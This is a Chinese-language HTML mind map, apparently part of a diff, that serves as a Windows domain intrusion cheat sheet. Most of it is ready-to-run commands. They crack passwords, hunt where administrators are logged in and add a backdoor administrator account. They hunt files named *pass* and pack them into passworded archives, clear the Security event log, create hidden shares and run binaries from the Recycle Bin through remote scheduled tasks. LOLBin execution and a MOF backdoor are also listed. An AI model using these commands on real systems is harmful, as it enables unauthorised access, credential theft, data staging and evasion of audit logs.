+<ul id="fold1_58" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">John the Ripper</span>
+<ul><li><span style="color: #111111;">http://www.openwall.com/john/</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">SAMInside</span>
+
+</li>
+<li><span style="color: #111111;">Hashcat</span>
+<ul><li><span style="color: #111111;">http://hashcat.net/hashcat/</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">Ophcrack</span>
+<ul><li><span style="color: #111111;">http://ophcrack.sourceforge.net/</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#23450;&#20301;&#31649;&#29702;&#21592;
+<br>
+1&#65292;&#26597;&#30475;&#25351;&#23450;&#35745;&#31639;&#26426;&#30331;&#38470;&#39057;&#29575;&#26368;&#39640;&#30340;&#29992;&#25143;&#21644;IP
+<br>
+2&#65292;&#36890;&#36807;&#29992;&#25143;&#21517;&#26597;&#25214;&#20854;&#30331;&#38470;&#30340;&#35745;&#31639;&#26426;</span>
+<ul><li><span id="show1_59" class="foldclosed" onClick="show_folder('1_59')" style="POSITION: absolute">+</span> <span id="hide1_59" class="foldopened" onClick="hide_folder('1_59')">-</span>
+<span style="color: #111111;">&#26085;&#24535;&#20998;&#26512;
+<br>
+&#36890;&#36807;&#31995;&#32479;&#23433;&#20840;&#26085;&#24535;&#65292;&#21487;&#20197;&#26597;&#30475;&#29992;&#25143;&#30331;&#38470;IP</span>
+<ul id="fold1_59" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#23545;&#29992;&#25143;&#37197;&#32622;&#20102;&#25351;&#23450;&#30331;&#38470;&#30340;&#26426;&#23376;&#21487;&#20197;&#26597;&#30475;&#20854;&#23545;&#24212;&#30340;userWorkstations&#21442;&#25968;</span>
+
+</li>
+<li><span style="color: #111111;">Dumpel</span>
+<ul><li><span style="color: #111111;">dumpel -f event.out -l security -c -d 3 -format dtucs</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">Wevtutil</span>
+<ul><li><span id="show1_59_1" class="foldclosed" onClick="show_folder('1_59_1')" style="POSITION: absolute">+</span> <span id="hide1_59_1" class="foldopened" onClick="hide_folder('1_59_1')">-</span>
+<span style="color: #111111;">Enables you to retrieve information about event logs and publishers.</span>
+<ul id="fold1_59_1" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#23548;&#20986;&#25351;&#23450;&#26085;&#24535;
+<br>
+wevtutil epl Security log.evtx
+<br>
+gl | get-log &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#33719;&#21462;&#26085;&#24535;&#37197;&#32622;&#20449;&#24687;
+<br>
+&#32467;&#26500;&#21270;&#26597;&#35810;
+<br>
+wevtutil qe Security /c:1000 /rd:true /f:text
+<br>
+/r:remote /u:username /p:password
+<br>
+&#26597;&#35810;&#35821;&#21477;
+<br>
+/q:"*[System[(EventID=4624 or EventID=4632) and TimeCreated[timediff(@SystemTime) &lt;= 2592000000]]] and *[EventData/Data[@Name='TargetUserName']='user1']"
+<br>
+tips:&#20351;&#29992;&#26085;&#24535;&#36807;&#28388;&#22120;&#29983;&#25104;xml&#26597;&#35810;&#35821;&#21477;
+<br>
+&#26597;&#35810;&#25351;&#23450;&#29992;&#25143;&#36828;&#31243;&#26700;&#38754;&#30331;&#38470;&#35760;&#24405;
+<br>
+wevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager/Operational /rd:true /q:"*[UserData/EventXML[User='RUOS\user1']]"
+<br>
+cl &#28165;&#38500;&#26085;&#24535;
+<br>
+wevtutil cl Security
+<br>
+https://technet.microsoft.com/en-us/library/cc732848</span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li>wecutil
+
+</li>
+<li><span id="show1_59_2" class="foldclosed" onClick="show_folder('1_59_2')" style="POSITION: absolute">+</span> <span id="hide1_59_2" class="foldopened" onClick="hide_folder('1_59_2')">-</span>
+<span style="color: #111111;">Elogdmp</span>
+<ul id="fold1_59_2" style="POSITION: relative; VISIBILITY: visible;"><li>ELOGDMP machinename eventlogtype
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">Get-EventLog</span>
+<ul><li><span style="color: #111111;">Get-EventLog -List
+<br>
+Get-EventLog -LogName "Security" -InstanceID 4624</span>
+
+</li>
+
+</ul>
+</li>
+<li>Get-WinEvent
+
+</li>
+<li><span style="color: #111111;">logparser</span>
+<ul><li><p><span style="color: #111111;">The world is your database with Log Parser
+<br>
+LogParser -i:EVT file:query.sql -o:CSV
+<br>
+https://technet.microsoft.com/en-us/scriptcenter/dd919274.aspx</span>
+<p><span style="color: #111111;">&#36741;&#21161;&#24037;&#20855;VisualLogParser</span>
+<ul><li><p><span style="color: #111111;">http://visuallogparser.codeplex.com/
+<br>
+query.sql
+<br>
+SELECT
+<br>
+--TOP 20 *
+<br>
+EXTRACT_TOKEN(Strings,5,'|') AS User,
+<br>
+EXTRACT_TOKEN(Strings,18,'|') AS IP,
+<br>
+TimeGenerated
+<br>
+FROM C:\Security.evtx
+<br>
+WHERE EventID = 4624 
+<br>
+AND User like '%username%'
+<br>
+ORDER BY IP
+<br>
+</span>
+</li>
+</ul></li>
+</ul>
+</li>
+<li>evtwalk
+<ul><li>https://tzworks.net/prototype_page.php?proto_id=25
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span id="show1_60" class="foldclosed" onClick="show_folder('1_60')" style="POSITION: absolute">+</span> <span id="hide1_60" class="foldopened" onClick="hide_folder('1_60')">-</span>
+Powerview
+<ul id="fold1_60" style="POSITION: relative; VISIBILITY: visible;"><li><p><span id="show1_60_1" class="foldclosed" onClick="show_folder('1_60_1')" style="POSITION: absolute">+</span> <span id="hide1_60_1" class="foldopened" onClick="hide_folder('1_60_1')">-</span>
+&#22312;&#26412;&#22320;&#22495;&#26597;&#25214;&#25351;&#23450;&#29992;&#25143;&#30331;&#38470;&#30340;&#26426;&#22120;
+<br>
+powershell.exe -exec bypass -Command "&amp; {Import-Module .\powerview.ps1; &nbsp;Invoke-UserHunter -UserName "user1" -SearchDays 7}"
+<br>
+&#22312;&#22495;&#25511;&#20107;&#20214;&#26085;&#24535;&#20013;&#26597;&#25214;&#29992;&#25143;&#30331;&#24405;&#20107;&#20214;
+<br>
+Invoke-UserEventHunter
+<br>
+
+<ul id="fold1_60_1" style="POSITION: relative; VISIBILITY: visible;"><li>https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
+
+</li>
+
+</ul></li>
+</ul>
+</li>
+<li><span id="show1_61" class="foldclosed" onClick="show_folder('1_61')" style="POSITION: absolute">+</span> <span id="hide1_61" class="foldopened" onClick="hide_folder('1_61')">-</span>
+<span style="color: #111111;">PsLoggedon.exe</span>
+<ul id="fold1_61" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">See who's logged on
+<br>
+PsLoggedon.exe -accepteula
+<br>
+Users logged on locally:
+<br>
+ &nbsp;&nbsp;&nbsp;&nbsp;&lt;unknown time&gt;		RUOS\user1 &nbsp;&nbsp;//&#20302;&#26435;&#38480;&#29992;&#25143;&#26080;&#27861;&#21015;&#20986;&#30331;&#38470;&#26102;&#38388;
+<br>
+ &nbsp;&nbsp;&nbsp;&nbsp;&lt;unknown time&gt;		RUOS\Administrator
+<br>
+No one is logged on via resource shares.</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_62" class="foldclosed" onClick="show_folder('1_62')" style="POSITION: absolute">+</span> <span id="hide1_62" class="foldopened" onClick="hide_folder('1_62')">-</span>
+LogonSessions.exe
+<ul id="fold1_62" style="POSITION: relative; VISIBILITY: visible;"><li>&#21015;&#20986;&#24403;&#21069;&#27963;&#21160;&#20250;&#35805;
+<br>
+logonsessions -c &gt; ls.csv
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_63" class="foldclosed" onClick="show_folder('1_63')" style="POSITION: absolute">+</span> <span id="hide1_63" class="foldopened" onClick="hide_folder('1_63')">-</span>
+LastLogon
+<ul id="fold1_63" style="POSITION: relative; VISIBILITY: visible;"><li>&#33719;&#21462;&#29992;&#25143;lastLogon &#23646;&#24615;&#20540;
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_64" class="foldclosed" onClick="show_folder('1_64')" style="POSITION: absolute">+</span> <span id="hide1_64" class="foldopened" onClick="hide_folder('1_64')">-</span>
+<span style="color: #111111;">PVEFindADUser.exe</span>
+<ul id="fold1_64" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#26522;&#20030;&#20986;&#22495;&#20869;&#25152;&#26377;&#26426;&#23376;&#30340;&#24403;&#21069;&#30331;&#24405;&#29992;&#25143;
+<br>
+PVEFindADUser.exe -current
+<br>
+&#26174;&#31034;&#25351;&#23450;&#29992;&#25143;&#30331;&#38470;&#30340;&#26426;&#23376;
+<br>
+PVEFindADUser.exe -current "domain\user1"</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_65" class="foldclosed" onClick="show_folder('1_65')" style="POSITION: absolute">+</span> <span id="hide1_65" class="foldopened" onClick="hide_folder('1_65')">-</span>
+<span style="color: #111111;">Query</span>
+<ul id="fold1_65" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">QUERY { PROCESS | SESSION | TERMSERVER | USER }
+<br>
+query user /?
+<br>
+&#26174;&#31034;&#26377;&#20851;&#30331;&#24405;&#21040;&#35813;&#31995;&#32479;&#30340;&#29992;&#25143;&#30340;&#20449;&#24687;&#12290;
+<br>
+QUERY USER [username | sessionname | sessionid] [/SERVER:servername]
+<br>
+query user
+<br>
+iis apppool\defaultapppool &#26435;&#38480;&#26080;&#27861;&#21015;&#20986;&#30331;&#38470;&#29992;&#25143;&#65292;&#21487;&#20351;&#29992;PsLoggedon.exe
+<br>
+To display information about the user USER1 on server SERVER1
+<br>
+query user USER1 /server:SERVER1</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_66" class="foldclosed" onClick="show_folder('1_66')" style="POSITION: absolute">+</span> <span id="hide1_66" class="foldopened" onClick="hide_folder('1_66')">-</span>
+IIS&#26085;&#24535;
+<ul id="fold1_66" style="POSITION: relative; VISIBILITY: visible;"><li>&#26597;&#30475;&#35775;&#38382;&#31649;&#29702;&#39029;&#38754;&#39057;&#29575;&#26368;&#39640;&#30340;ip
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_67" class="foldclosed" onClick="show_folder('1_67')" style="POSITION: absolute">+</span> <span id="hide1_67" class="foldopened" onClick="hide_folder('1_67')">-</span>
+&#29992;&#25143;&#30331;&#38470;&#33050;&#26412;
+<ul id="fold1_67" style="POSITION: relative; VISIBILITY: visible;"><li><p>&#22495;&#25511;&#33050;&#26412;&#30446;&#24405;
+<br>
+C:\Windows\SYSVOL\sysvol\example.org\scripts\logon.cmd
+<br>
+&#29992;&#25143;-&#23646;&#24615;-&#37197;&#32622;&#25991;&#20214;
+<br>
+&#30331;&#38470;&#33050;&#26412;:logon.cmd
+<br>
+&#21629;&#20196;&#34892;&#19979;&#28155;&#21152;
+<br>
+net user user1 /scriptpath:logon.cmd
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#24120;&#29992;&#24037;&#20855;&#21629;&#20196;</span>
+<ul><li><span style="color: #111111;">Net</span>
+<ul><li><span id="show1_68" class="foldclosed" onClick="show_folder('1_68')" style="POSITION: absolute">+</span> <span id="hide1_68" class="foldopened" onClick="hide_folder('1_68')">-</span>
+<span style="color: #111111;">Net use</span>
+<ul id="fold1_68" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#24314;&#31435;&#36830;&#25509;
+<br>
+net use \\192.168.6.2\ipc$ "password" /USER:domian\user
+<br>
+&#21015;&#20986;&#36830;&#25509;
+<br>
+net use
+<br>
+&#21024;&#38500;&#25152;&#26377;&#36830;&#25509;
+<br>
+net use * /del /yes
+<br>
+&#26144;&#23556;&#32593;&#32476;&#39537;&#21160;&#22120;
+<br>
+net use m: \\financial\letters\User2</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_69" class="foldclosed" onClick="show_folder('1_69')" style="POSITION: absolute">+</span> <span id="hide1_69" class="foldopened" onClick="hide_folder('1_69')">-</span>
+<span style="color: #111111;">Net user</span>
+<ul id="fold1_69" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#28155;&#21152;&#36134;&#25143;
+<br>
+net user adminh H112233 /add
+<br>
+&#21152;&#20837;&#31649;&#29702;&#32452;
+<br>
+net localgroup administrators adminh /add
+<br>
+&#28608;&#27963;&#36134;&#25143;
+<br>
+net user test /active:yes
+<br>
+&#36134;&#25143;&#21040;&#26399;
+<br>
+net user test /expires:never
+<br>
+&#26597;&#30475;&#22495;&#29992;&#25143;
+<br>
+net user /domain</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_70" class="foldclosed" onClick="show_folder('1_70')" style="POSITION: absolute">+</span> <span id="hide1_70" class="foldopened" onClick="hide_folder('1_70')">-</span>
+<span style="color: #111111;">Net session</span>
+<ul id="fold1_70" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#21015;&#20986;&#25110;&#26029;&#24320;&#20250;&#35805;
+<br>
+net session [\\&lt;ComputerName&gt;] [/delete] [/list]</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_71" class="foldclosed" onClick="show_folder('1_71')" style="POSITION: absolute">+</span> <span id="hide1_71" class="foldopened" onClick="hide_folder('1_71')">-</span>
+<span style="color: #111111;">Net share</span>
+<ul id="fold1_71" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#20849;&#20139;&#21517;&#23383;&#21518;&#38754;&#21152;&#19978;$&#31526;&#21495;&#65292;&#36164;&#28304;&#31649;&#29702;&#22120;&#30331;&#38470;&#23558;&#30475;&#19981;&#35265;&#27492;&#20849;&#20139;
+<br>
+net share &lt;ShareName$&gt;=&lt;drive&gt;:&lt;DirectoryPath&gt; [/grant:&lt;user&gt;,{read | change |full}] 
+<br>
+net share &lt;ShareName$&gt; \\&lt;ComputerName&gt; /delete
+<br>
+ex:
+<br>
+net share sharename$=c:\share /GRANT:Everyone,FULL</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_72" class="foldclosed" onClick="show_folder('1_72')" style="POSITION: absolute">+</span> <span id="hide1_72" class="foldopened" onClick="hide_folder('1_72')">-</span>
+<span style="color: #111111;">Net view</span>
+<ul id="fold1_72" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#26597;&#30475;&#20849;&#20139;&#36164;&#28304;
+<br>
+net view \\production</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#25991;&#20214;&#25805;&#20316;</span>
+<ul><li><span style="color: #111111;">&#26597;&#25214;&#25991;&#20214;</span>
+<ul><li><span id="show1_73" class="foldclosed" onClick="show_folder('1_73')" style="POSITION: absolute">+</span> <span id="hide1_73" class="foldopened" onClick="hide_folder('1_73')">-</span>
+<span style="color: #111111;">where</span>
+<ul id="fold1_73" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#22312;C&#30424;&#26597;&#25214;&#21547;&#26377;&#25351;&#23450;&#20851;&#38190;&#23383;&#30340;&#25991;&#20214;
+<br>
+where /R C: *pass* *server* *email* *database* *crm* &gt; C:\filelists.txt</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">find</span>
+<ul><li><span style="color: #111111;">find / -name *pass*</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li>findstr
+<ul><li>findstr "strings" 11.txt
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#21387;&#32553;/&#35299;&#21387;</span>
+<ul><li><span id="show1_74" class="foldclosed" onClick="show_folder('1_74')" style="POSITION: absolute">+</span> <span id="hide1_74" class="foldopened" onClick="hide_folder('1_74')">-</span>
+<span style="color: #111111;">rar</span>
+<ul id="fold1_74" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#20197;&#31561;&#32423;5&#26368;&#22823;&#21387;&#32553;&#65292;-hp&#25351;&#23450;&#23494;&#30721;
+<br>
+rar a -m5 1.rar file1 file2 ... &nbsp;-hppassword
+<br>
+rar a -m5 1.rar folder &nbsp;-hppassword
+<br>
+RAR from file (where find)
+<br>
+rar a -m5 11.rar @filelists.txt -hppassword</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">unrar</span>
+<ul><li><span style="color: #111111;">unrar x 1.rar</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">unzip</span>
+<ul><li><span style="color: #111111;">http://www.info-zip.org/</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">tar</span>
+<ul><li>tar -zcvf file.tar.gz file1 file2
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span id="show1_75" class="foldclosed" onClick="show_folder('1_75')" style="POSITION: absolute">+</span> <span id="hide1_75" class="foldopened" onClick="hide_folder('1_75')">-</span>
+<span style="color: #111111;">Dir</span>
+<ul id="fold1_75" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">/A &nbsp;&#26174;&#31034;&#20855;&#26377;&#25351;&#23450;&#23646;&#24615;&#30340;&#25991;&#20214;&#12290;
+<br>
+/B &#20351;&#29992;&#31354;&#26684;&#24335;(&#27809;&#26377;&#26631;&#39064;&#20449;&#24687;&#25110;&#25688;&#35201;)&#12290;
+<br>
+/S &#26174;&#31034;&#25351;&#23450;&#30446;&#24405;&#21644;&#25152;&#26377;&#23376;&#30446;&#24405;&#20013;&#30340;&#25991;&#20214;&#12290;
+<br>
+&#21629;&#20196;
+<br>
+dir c:\ /B /S /A:H</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_76" class="foldclosed" onClick="show_folder('1_76')" style="POSITION: absolute">+</span> <span id="hide1_76" class="foldopened" onClick="hide_folder('1_76')">-</span>
+<span style="color: #111111;">fsutil</span>
+<ul id="fold1_76" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#26597;&#30475;&#39537;&#21160;&#22120;
+<br>
+fsutil fsinfo drives</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_77" class="foldclosed" onClick="show_folder('1_77')" style="POSITION: absolute">+</span> <span id="hide1_77" class="foldopened" onClick="hide_folder('1_77')">-</span>
+<span style="color: #111111;">Cacls &#26174;&#31034;&#21644;&#20462;&#25913;&#25991;&#20214;ACLs</span>
+<ul id="fold1_77" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#26597;&#30475;&#25991;&#20214;ACLs
+<br>
+CACLS filename
+<br>
+&#36171;&#20104;&#29992;&#25143;user&#23545;&#25991;&#20214;filename&#23436;&#20840;&#25511;&#21046;
+<br>
+CACLS filename /t /e /c /G user:f</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_78" class="foldclosed" onClick="show_folder('1_78')" style="POSITION: absolute">+</span> <span id="hide1_78" class="foldopened" onClick="hide_folder('1_78')">-</span>
+<span style="color: #111111;">du.exe</span>
+<ul id="fold1_78" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#26597;&#30475;&#25991;&#20214;&#22841;&#22823;&#23567;
+<br>
+du.exe -accepteula -l 1 -c d:\data &nbsp;&gt; c:\dr.csv</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_79" class="foldclosed" onClick="show_folder('1_79')" style="POSITION: absolute">+</span> <span id="hide1_79" class="foldopened" onClick="hide_folder('1_79')">-</span>
+<span style="color: #111111;">Del &#21024;&#38500;&#25991;&#20214;</span>
+<ul id="fold1_79" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">del /f /q /s &lt;filename&gt; </span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_80" class="foldclosed" onClick="show_folder('1_80')" style="POSITION: absolute">+</span> <span id="hide1_80" class="foldopened" onClick="hide_folder('1_80')">-</span>
+<span style="color: #111111;">rmdir / rd &#21024;&#38500;&#30446;&#24405;</span>
+<ul id="fold1_80" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">rmdir /q /s &lt;dir&gt;</span>
+
+</li>
+
+</ul>
+</li>
+<li>copy
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_81" class="foldclosed" onClick="show_folder('1_81')" style="POSITION: absolute">+</span> <span id="hide1_81" class="foldopened" onClick="hide_folder('1_81')">-</span>
+&#21629;&#20196;&#25191;&#34892;
+<ul id="fold1_81" style="POSITION: relative; VISIBILITY: visible;"><li>CMSTP
+<ul><li>https://yq.aliyun.com/articles/596234
+
+</li>
+
+</ul>
+</li>
+<li>Mavinject
+<ul><li>http://www.4hou.com/technology/12276.html
+
+</li>
+
+</ul>
+</li>
+<li>DiskShadow
+<ul><li>http://www.4hou.com/technology/10968.html
+
+</li>
+
+</ul>
+</li>
+<li>sdbinst
+<ul><li>http://www.4hou.com/technology/760.html
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span id="show1_82" class="foldclosed" onClick="show_folder('1_82')" style="POSITION: absolute">+</span> <span id="hide1_82" class="foldopened" onClick="hide_folder('1_82')">-</span>
+<span style="color: #111111;">mstsc</span>
+<ul id="fold1_82" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#24378;&#21046;&#30331;&#38470;
+<br>
+mstsc /admin /v:192.168.6.2:3389</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_83" class="foldclosed" onClick="show_folder('1_83')" style="POSITION: absolute">+</span> <span id="hide1_83" class="foldopened" onClick="hide_folder('1_83')">-</span>
+WMI
+<ul id="fold1_83" style="POSITION: relative; VISIBILITY: visible;"><li><span id="show1_83_1" class="foldclosed" onClick="show_folder('1_83_1')" style="POSITION: absolute">+</span> <span id="hide1_83_1" class="foldopened" onClick="hide_folder('1_83_1')">-</span>
+<span style="color: #111111;">Wmic
+<br>
+Displays WMI information inside an interactive command shell.</span>
+<ul id="fold1_83_1" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#21015;&#20986;&#36827;&#31243;
+<br>
+wmic process list brief
+<br>
+&#21019;&#24314;&#36827;&#31243;
+<br>
+wmic process call create "notepad.exe"
+<br>
+wmic /node:"hostname" /user:"domain\administrator" /password:"123456" process get name,processid
+<br>
+&#32467;&#26463;&#31243;&#24207;
+<br>
+wmic process where name="qq.exe" call terminate 
+<br>
+&#21551;&#21160;&#26381;&#21153;
+<br>
+wmic SERVICE where name="tlntsvr" call startservice
+<br>
+&#35745;&#21010;&#20219;&#21153;
+<br>
+wmic job
+<br>
+</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_83_2" class="foldclosed" onClick="show_folder('1_83_2')" style="POSITION: absolute">+</span> <span id="hide1_83_2" class="foldopened" onClick="hide_folder('1_83_2')">-</span>
+Get-WmiObject
+<ul id="fold1_83_2" style="POSITION: relative; VISIBILITY: visible;"><li><p>PS C:\&gt; get-wmiobject -class "win32_share" -computer "WIN-1OQO62UPUD5" -Credential domain\administrator
+</li>
+</ul>
+</li>
+<li>WinRM
+
+</li>
+<li>MOF&#21518;&#38376;
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_84" class="foldclosed" onClick="show_folder('1_84')" style="POSITION: absolute">+</span> <span id="hide1_84" class="foldopened" onClick="hide_folder('1_84')">-</span>
+<span style="color: #111111;font-family: SansSerif, sans-serif; ">&#35745;&#21010;&#20219;&#21153;</span>
+<ul id="fold1_84" style="POSITION: relative; VISIBILITY: visible;"><li><span id="show1_84_1" class="foldclosed" onClick="show_folder('1_84_1')" style="POSITION: absolute">+</span> <span id="hide1_84_1" class="foldopened" onClick="hide_folder('1_84_1')">-</span>
+<span style="color: #111111;">Schtasks</span>
+<ul id="fold1_84_1" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#21019;&#24314;&#20219;&#21153;</span>
+<ul><li><p><span style="color: #111111;">schtasks /create /tn taskname /tr c:\$Recycle.Bin\bh.exe /sc once /st 18:00 /ru "System" /s ip /u admin /p password</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">&#26597;&#35810;&#20219;&#21153;</span>
+<ul><li>SCHTASKS /Query /S system /U user /P password
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#25191;&#34892;&#20219;&#21153;</span>
+<ul><li><span style="color: #111111;">schtasks /run /tn taskname /s ip /u admin /p password</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#21024;&#38500;&#20219;&#21153;</span>
+<ul><li><span style="color: #111111;">schtasks /delete /f /tn taskname /s ip /u admin /p password</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span id="show1_84_2" class="foldclosed" onClick="show_folder('1_84_2')" style="POSITION: absolute">+</span> <span id="hide1_84_2" class="foldopened" onClick="hide_folder('1_84_2')">-</span>
+<span style="color: #111111;">At</span>
+<ul id="fold1_84_2" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#20808;&#24314;&#31435;net use&#36830;&#25509;
+<br>
+&#26597;&#30475;&#36828;&#31243;&#20027;&#26426;&#26102;&#38388;
+<br>
+net time \\ip
+<br>
+&#22312;&#20854;&#20043;&#21518;&#24314;&#31435;&#35745;&#21010;&#20219;&#21153;&#65288;&#27880;&#24847;&#21035;&#25226;&#38393;&#38047;&#23450;&#21040;&#31532;&#20108;&#22825;&#20102;&#21734;&#65281;&#65289;
+<br>
+at \\ip 00:00 c:\1.exe
+<br>
+&#26597;&#30475;&#20219;&#21153;
+<br>
+at \\ip
+<br>
+&#21024;&#38500;&#20219;&#21153;
+<br>
+at \\ip "job ID" /delete /yes </span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li>sc
+
+</li>
+<li><span id="show1_85" class="foldclosed" onClick="show_folder('1_85')" style="POSITION: absolute">+</span> <span id="hide1_85" class="foldopened" onClick="hide_folder('1_85')">-</span>
+<span style="color: #111111;">&#20462;&#25913;&#31574;&#30053;</span>
+<ul id="fold1_85" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">Secedit</span>
+<ul><li><span id="show1_85_1" class="foldclosed" onClick="show_folder('1_85_1')" style="POSITION: absolute">+</span> <span id="hide1_85_1" class="foldopened" onClick="hide_folder('1_85_1')">-</span>
+<span style="color: #111111;">Configures and analyzes system security .</span>
+<ul id="fold1_85_1" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#23548;&#20986;&#23433;&#20840;&#27169;&#26495;&#25991;&#20214;
+<br>
+secedit /export /cfg gp.inf
+<br>
+&#37197;&#32622;&#32452;&#31574;&#30053;
+<br>
+secedit /configure /db gp.sdb /cfg gp.inf /quiet
+<br>
+&#26816;&#27979;&#35821;&#27861;&#38169;&#35823;
+<br>
+secedit /validate gp.inf
+<br>
+
+<br>
+gp.inf&#25991;&#20214;
+<br>
+[version]
+<br>
+signature="$CHICAGO$"
+<br>
+[System Access]
+<br>
+MinimumPasswordLength = 6
+<br>
+PasswordComplexity = 1</span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">Auditpol</span>
+<ul><li><span style="color: #111111;">Displays information about and performs functions to manipulate audit policies.</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#23494;&#30721;&#31574;&#30053;</span>
+<ul><li><span style="color: #111111;">&#23494;&#30721;&#27704;&#19981;&#36807;&#26399;
+<br>
+WMIC USERACCOUNT WHERE "Name='username'" SET PasswordExpires=FALSE</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">start /b</span>
+
+</li>
+<li><span style="color: #111111;">date /t</span>
+
+</li>
+<li><span style="color: #111111;">&#24494;&#36719;&#24037;&#20855;&#21253;</span>
+<ul><li><span id="show1_86" class="foldclosed" onClick="show_folder('1_86')" style="POSITION: absolute">+</span> <span id="hide1_86" class="foldopened" onClick="hide_folder('1_86')">-</span>
+<span style="color: #111111;">Windows Server 2003 Service Pack 1 32-bit Support Tools </span>
+<ul id="fold1_86" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">WindowsServer2003-KB892777-SupportTools-x86-ENU.exe
+<br>
+https://www.microsoft.com/en-us/download/details.aspx?id=7911</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_87" class="foldclosed" onClick="show_folder('1_87')" style="POSITION: absolute">+</span> <span id="hide1_87" class="foldopened" onClick="hide_folder('1_87')">-</span>
+Remote Server Administration Tools
+<ul id="fold1_87" style="POSITION: relative; VISIBILITY: visible;"><li><p>Windows Server 2003 
+<br>
+https://www.microsoft.com/en-us/download/details.aspx?id=16770
+<br>
+Windows 8
+<br>
+https://www.microsoft.com/en-us/download/details.aspx?id=28972
+</li>
+</ul>
+</li>
+<li><span id="show1_88" class="foldclosed" onClick="show_folder('1_88')" style="POSITION: absolute">+</span> <span id="hide1_88" class="foldopened" onClick="hide_folder('1_88')">-</span>
+<span style="color: #111111;">Windows Server 2003 Resource Kit Tools </span>
+<ul id="fold1_88" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">rktools.exe
+<br>
+https://www.microsoft.com/en-us/download/details.aspx?id=17657</span>
+
+</li>
+
+</ul>
+</li>
